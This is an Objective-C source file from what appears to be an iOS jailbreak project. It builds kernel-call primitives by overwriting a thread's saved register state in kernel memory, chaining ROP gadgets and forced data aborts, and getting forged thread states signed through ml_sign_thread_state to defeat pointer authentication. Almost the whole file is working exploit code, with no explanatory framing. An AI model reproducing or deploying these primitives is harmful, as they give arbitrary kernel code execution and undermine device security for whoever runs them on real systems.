#import "kcall.h"

#import <stdint.h>
#import <stdbool.h>
#import <mach/mach.h>
#import <mach-o/dyld.h>
#import <libfilecom/FCHandler.h>
#import "pplrw.h"
#import "util.h"
#import "jailbreakd.h"
#import "launchd.h"
#import "boot_info.h"
#import "log.h"

typedef struct {
	bool inited;
	thread_t gExploitThread;
	uint64_t gScratchMemKern;
	volatile uint64_t *gScratchMemMapped;
	arm_thread_state64_t gExploitThreadState;
	uint64_t gSpecialMemRegion;
	uint64_t gIntStack;
	uint64_t gOrigIntStack;
	uint64_t gReturnContext;
	uint64_t gACTPtr;
	uint64_t gACTVal;
	uint64_t gCPUData;
} exploitThreadInfo;

typedef struct {
	thread_t thread;
	uint64_t actContext;
	kRegisterState signedState;
	uint64_t kernelStack;
	kRegisterState *mappedState;
	uint64_t scratchMemory;
	uint64_t *scratchMemoryMapped;
} Fugu14KcallThread;

static void* gThreadMapContext;
static uint8_t* gThreadMapStart;
static Fugu14KcallThread gFugu14KcallThread;
KcallStatus gKCallStatus = kKcallStatusNotInitialized;

#define MEMORY_BARRIER asm volatile("dmb sy");

uint64_t gUserReturnThreadContext = 0;
volatile uint64_t gUserReturnDidHappen = 0;
static NSLock *gKcallLock;

uint64_t getUserReturnThreadContext(void) {
	if (gUserReturnThreadContext != 0) {
		return gUserReturnThreadContext;
	}
	
	arm_thread_state64_t state;
	bzero(&state, sizeof(state));
	
	arm_thread_state64_set_pc_fptr(state, (void*)pac_loop);
	for (size_t i = 0; i < 29; i++) {
		state.__x[i] = 0xDEADBEEF00ULL | i;
	}
	
	thread_t chThread = 0;
	kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t)&state, ARM_THREAD_STATE64_COUNT, &chThread);
	if (kr != KERN_SUCCESS) {
		JBLogError("[-] getUserReturnThreadContext: Failed to create return thread!");
		return 0;
	}
	
	thread_suspend(chThread);
	
	uint64_t returnThreadPtr = task_get_first_thread(self_task());
	if (returnThreadPtr == 0) {
		JBLogError("[-] getUserReturnThreadContext: Failed to find return thread!");
		return 0;
	}
	
	uint64_t returnThreadACTContext = thread_get_act_context(returnThreadPtr);
	if (returnThreadACTContext == 0) {
		JBLogError("[-] getUserReturnThreadContext: Return thread has no ACT_CONTEXT?!");
		return 0;
	}
	
	gUserReturnThreadContext = returnThreadACTContext;
	
	return returnThreadACTContext;
}

// This prepares the thread state for an ordinary Fugu14 like kcall
// It is possible to bypass this by just calling kcall_with_raw_thread_state with any thread state you want
void Fugu14Kcall_prepareThreadState(Fugu14KcallThread *callThread, KcallThreadState *threadState)
{
	// Set pc to the function, lr to str x0, [x19]; ldr x??, [x20]; gadget
	threadState->lr = bootInfo_getSlidUInt64(@"str_x0_x19_ldr_x20");

	// New state
	// x19 -> Where to store return value
	threadState->x[19] = callThread->scratchMemory;
	
	// x20 -> NULL (to force data abort)
	threadState->x[20] = 0;
	
	// x22 -> exceptionReturn
	threadState->x[22] = bootInfo_getSlidUInt64(@"exception_return");
	
	// Exception return expects a signed state in x21
	threadState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
	
	// Also need to set sp
	threadState->sp = callThread->kernelStack;
}

uint64_t Fugu14Kcall_withThreadState(Fugu14KcallThread *callThread, KcallThreadState *threadState)
{
	[gKcallLock lock];

	// Restore signed state first
	kwritebuf(callThread->actContext, &callThread->signedState, sizeof(kRegisterState));
	
	// Set all registers based on passed threadState
	kwrite64(callThread->actContext + offsetof(kRegisterState, x[1]), threadState->pc); // x1 -> new pc
	kwrite64(callThread->actContext + offsetof(kRegisterState, x[3]), threadState->lr); // x3 -> new lr
	for (int i = 0; i < 29; i++) {
		callThread->mappedState->x[i] = threadState->x[i];
	}
	callThread->mappedState->sp = threadState->sp;

	// Reset flag
	gUserReturnDidHappen = 0;
	
	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER
	
	// Run the thread
	thread_resume(callThread->thread);
	
	// Wait for flag to be set
	while (!gUserReturnDidHappen) ;
	
	// Stop thread
	thread_suspend(callThread->thread);
	thread_abort(callThread->thread);
	
	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER

	// Copy return value
	uint64_t retval = callThread->scratchMemoryMapped[0];

	[gKcallLock unlock];
	
	return retval;
}

uint64_t Fugu14Kcall_withArguments(Fugu14KcallThread *callThread, uint64_t func, uint64_t argc, uint64_t *argv)
{
	if (argc >= 19) argc = 19;

	KcallThreadState threadState = { 0 };
	Fugu14Kcall_prepareThreadState(&gFugu14KcallThread, &threadState);
	threadState.pc = func;

	[gKcallLock lock];

	uint64_t regArgc = 0;
	uint64_t stackArgc = 0;
	if (argc >= 8) {
		regArgc = 8;
		stackArgc = argc - 8;
	}
	else {
		regArgc = argc;
	}

	// Set register args (x0 - x8)
	for (uint64_t i = 0; i < regArgc; i++)
	{
		threadState.x[i] = argv[i];
	}

	// Set stack args
	for (uint64_t i = 0; i < stackArgc; i++)
	{
		uint64_t argKaddr = (threadState.sp + i * 0x8);
		kwrite64(argKaddr, argv[8+i]);
	}

	[gKcallLock unlock];

	return Fugu14Kcall_withThreadState(callThread, &threadState);
}

uint64_t kcall(uint64_t func, uint64_t argc, uint64_t *argv)
{
	if (gKCallStatus != kKcallStatusFinalized) {
		if (gIsJailbreakd) return 0;
		return jbdKcall(func, argc, argv);
	}
	return Fugu14Kcall_withArguments(&gFugu14KcallThread, func, argc, argv);
}

uint64_t kcall8(uint64_t func, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8)
{
	uint64_t argv[8] = {a1, a2, a3, a4, a5, a6, a7, a8};
	return kcall(func, 8, argv);
}

uint64_t kcall_with_raw_thread_state(KcallThreadState threadState)
{
	if (gKCallStatus != kKcallStatusFinalized) {
		if (gIsJailbreakd) return 0;
		return jbdKcallThreadState(&threadState, true);
	}
	return Fugu14Kcall_withThreadState(&gFugu14KcallThread, &threadState);
}

uint64_t kcall_with_thread_state(KcallThreadState threadState)
{
	if (gKCallStatus != kKcallStatusFinalized) {
		if (gIsJailbreakd) return 0;
		return jbdKcallThreadState(&threadState, false);
	}

	Fugu14Kcall_prepareThreadState(&gFugu14KcallThread, &threadState);
	return kcall_with_raw_thread_state(threadState);
}

uint64_t initPACPrimitives(uint64_t kernelAllocation)
{
	if (gKCallStatus != kKcallStatusNotInitialized || kernelAllocation == 0) {
		return 0;
	}

	gKcallLock = [[NSLock alloc] init];

	thread_t thread = 0;
	kern_return_t kr = thread_create(mach_task_self_, &thread);
	if (kr != KERN_SUCCESS) {
		JBLogError("[-] setupFugu14Kcall: thread_create failed!");
		return false;
	}
	
	// Find the thread
	uint64_t threadPtr = task_get_first_thread(self_task());
	if (threadPtr == 0) {
		JBLogError("[-] setupFugu14Kcall: Failed to find thread!");
		return false;
	}

	// Get it's state pointer
	uint64_t actContext = thread_get_act_context(threadPtr);
	if (threadPtr == 0) {
		JBLogError("[-] setupFugu14Kcall: Failed to get thread ACT_CONTEXT!");
		return false;
	}

	// Map in previously allocated memory for stack (4 Pages)
	gThreadMapContext = mapInVirtual(kernelAllocation, 4, &gThreadMapStart);
	if (!gThreadMapContext)
	{
		JBLogError("ERROR: gThreadMapContext lookup failure");
	}

	// stack is at middle of allocation
	uint64_t stack = kernelAllocation + 0x8000ULL;

	// Write context

	uint64_t str_x8_x9_gadget = bootInfo_getSlidUInt64(@"str_x8_x9_gadget");
	uint64_t exception_return_after_check = bootInfo_getSlidUInt64(@"exception_return_after_check");
	uint64_t brX22 = bootInfo_getSlidUInt64(@"br_x22_gadget");

	// Write register values
	kwrite64(actContext + offsetof(kRegisterState, pc),    str_x8_x9_gadget);
	kwrite32(actContext + offsetof(kRegisterState, cpsr),  get_cspr_kern_intr_dis());
	kwrite64(actContext + offsetof(kRegisterState, lr),    exception_return_after_check);
	kwrite64(actContext + offsetof(kRegisterState, x[16]), 0);
	kwrite64(actContext + offsetof(kRegisterState, x[17]), brX22);

	// Use str x8, [x9] gadget to set TH_KSTACKPTR
	kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x10ULL);
	kwrite64(actContext + offsetof(kRegisterState, x[9]), threadPtr + bootInfo_getUInt64(@"TH_KSTACKPTR"));

	// SP and x0 should both point to the new CPU state
	kwrite64(actContext + offsetof(kRegisterState, sp),   stack);
	kwrite64(actContext + offsetof(kRegisterState, x[0]), stack);

	// x2 -> new cpsr
	// Include in signed state since it is rarely changed
	kwrite64(actContext + offsetof(kRegisterState, x[2]), get_cspr_kern_intr_en());

	kRegisterState *mappedState = (kRegisterState*)((uintptr_t)gThreadMapStart + 0x8000ULL);

	gFugu14KcallThread.thread              = thread;
	gFugu14KcallThread.kernelStack         = stack;
	gFugu14KcallThread.scratchMemory       = stack + 0x7000ULL;
	gFugu14KcallThread.mappedState         = mappedState;
	gFugu14KcallThread.actContext          = actContext;
	gFugu14KcallThread.scratchMemoryMapped = (uint64_t*) ((uintptr_t)gThreadMapStart + 0xF000ULL);

	gKCallStatus = kKcallStatusPrepared;

	return actContext;
}

void finalizePACPrimitives(void)
{
	if (gKCallStatus != kKcallStatusPrepared) {
		return;
	}

	// When this is called, we except actContext to be signed,
	//  so we can continue to finish setting up the kcall thread

	uint64_t actContext = gFugu14KcallThread.actContext;
	thread_t thread = gFugu14KcallThread.thread;

	kRegisterState *mappedState = (kRegisterState*)((uintptr_t)gThreadMapStart + 0x8000ULL);

	// Create a copy of signed state
	kreadbuf(actContext, &gFugu14KcallThread.signedState, sizeof(kRegisterState));

	// Save signed state for later generations
	NSData *signedStateData = [NSData dataWithBytes:&gFugu14KcallThread.signedState length:sizeof(kRegisterState)];

	// Set a custom recovery handler
	uint64_t hw_lck_ticket_reserve_orig_allow_invalid = bootInfo_getSlidUInt64(@"hw_lck_ticket_reserve_orig_allow_invalid") + 4;
	
	// x1 -> new pc
	// x3 -> new lr
	kwrite64(actContext + offsetof(kRegisterState, x[1]), hw_lck_ticket_reserve_orig_allow_invalid);
	// We don't need lr here

	// New state
	// Force a data abort in hw_lck_ticket_reserve_orig_allow_invalid
	mappedState->x[0] = 0;
	
	// Fault handler is br x22 -> set x22
	mappedState->x[22] = bootInfo_getSlidUInt64(@"exception_return");
	
	// Exception return expects a signed state in x21
	mappedState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
	
	// Also need to set sp
	mappedState->sp = gFugu14KcallThread.kernelStack;
	
	// Reset flag
	gUserReturnDidHappen = 0;

	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER
	
	// Run the thread
	thread_resume(thread);
	
	// Wait for flag to be set
	while (!gUserReturnDidHappen) ;
	
	// Stop thread
	thread_suspend(thread);
	thread_abort(thread);
	
	// Done!
	// Thread's fault handler is now set to the br x22 gadget
	gKCallStatus = kKcallStatusFinalized;

	// Allocate a proper PPLRW placeholder page now if needed
	if (!bootInfo_getUInt64(@"pplrw_placeholder_page")) {
		uint64_t placeholderPage = 0;
		if (kalloc(&placeholderPage, 0x4000) == 0) {
			kwrite64(placeholderPage, placeholderPage);
			bootInfo_setObject(@"pplrw_placeholder_page", @(placeholderPage));
			PPLRW_updatePlaceholderPage(placeholderPage);
		}
	}
}

NSString *getExecutablePath(void)
{
	uint32_t bufsize = 0;
	_NSGetExecutablePath(NULL, &bufsize);
	char *executablePath = malloc(bufsize);
	_NSGetExecutablePath(&executablePath[0], &bufsize);
	NSString* nsExecutablePath = [NSString stringWithUTF8String:executablePath];
	free(executablePath);
	return nsExecutablePath;
}

int signState(uint64_t actContext)
{
	kRegisterState state;
	kreadbuf(actContext, &state, sizeof(state));

	uint64_t signThreadStateFunc = bootInfo_getSlidUInt64(@"ml_sign_thread_state");
	kcall8(signThreadStateFunc, actContext, state.pc, state.cpsr, state.lr, state.x[16], state.x[17], 0, 0);
	return 0;
}

// jailbreakd -> launchd (using XPC)
int signStateOverJailbreakd(uint64_t actContext)
{
	// kcall automatically goes to jbdKcall when this process does not have the primitive
	// so we can just call it here and except it to go through jbd
	return signState(actContext);
}

// launchd -> jailbreakd / boomerang (using XPC)
int signStateOverLaunchd(uint64_t actContext)
{
	xpc_object_t msg = xpc_dictionary_create_empty();
	xpc_dictionary_set_bool(msg, "jailbreak", true);
	xpc_dictionary_set_uint64(msg, "id", LAUNCHD_JB_MSG_ID_SIGN_STATE);
	xpc_dictionary_set_uint64(msg, "actContext", actContext);

	xpc_object_t reply = launchd_xpc_send_message(msg);
	return xpc_dictionary_get_int64(reply, "error");
}

// boomerang <-> launchd (using libfilecom)
int signStateLibFileCom(uint64_t actContext, NSString *from, NSString *to)
{
	NSString *fromPath = [NSString stringWithFormat:prebootPath(@"basebin/.communication/%@_to_%@"), from, to];
	NSString *toPath = [NSString stringWithFormat:prebootPath(@"basebin/.communication/%@_to_%@"), to, from];
	dispatch_semaphore_t sema = dispatch_semaphore_create(0);
	FCHandler *handler = [[FCHandler alloc] initWithReceiveFilePath:fromPath sendFilePath:toPath];
	handler.receiveHandler = ^(NSDictionary *message) {
		NSString *identifier = message[@"id"];
		if (identifier) {
			if ([identifier isEqualToString:@"signedThreadState"])
			{
				dispatch_semaphore_signal(sema);
			}
		}
	};
	[handler sendMessage:@{ @"id" : @"signThreadState", @"actContext" : @(actContext) }];
	dispatch_semaphore_wait(sema, DISPATCH_TIME_FOREVER);

	return 0;
}

int recoverPACPrimitives()
{
	NSString *processName = getExecutablePath().lastPathComponent;

	// Before we can recover PAC primitives, we need to have PPLRW primitives
	if (gPPLRWStatus != kPPLRWStatusInitialized) return -1;

	// These are the only 3 processes that ever have kcall primitives
	// All other processes can access kcall over XPC to jailbreakd
	NSArray *allowedProcesses = @[@"jailbreakd", @"launchd", @"boomerang"];  
	if (![allowedProcesses containsObject:processName]) return -2;

	// Get pre made kernel allocation from boot info (set in oobPCI main.c during initial jailbreak)
	uint64_t kernelAllocation = bootInfo_getUInt64([NSString stringWithFormat:@"%@_pac_allocation", processName]);

	// Get context to sign
	uint64_t actContextKptr = initPACPrimitives(kernelAllocation);
	int signStatus = 0;

	// Sign context using suitable method based on process and system state
	if ([processName isEqualToString:@"jailbreakd"]) {
		signStatus = signStateOverLaunchd(actContextKptr);
	}
	else if ([processName isEqualToString:@"boomerang"]) {
		signStatus = signStateLibFileCom(actContextKptr, @"launchd", @"boomerang");
	}
	else if ([processName isEqualToString:@"launchd"])
	{
		bool environmentInitialized = (bool)bootInfo_getUInt64(@"environmentInitialized");
	
		// When launchd was already initialized once, we want to get primitives from boomerang
		// (As we are coming from a userspace reboot)
		if (environmentInitialized) {
			signStatus = signStateLibFileCom(actContextKptr, @"boomerang", @"launchd");
		}
		// Otherwise we want to get them from jailbreakd,
		// (As we are coming from a fresh jailbreak)
		else {
			signStatus = signStateOverJailbreakd(actContextKptr);
		}
	}

	// Signing failed, abort
	if (signStatus != 0) return -3;

	// If everything went well, finalize and return success
	finalizePACPrimitives();
	return 0;
}
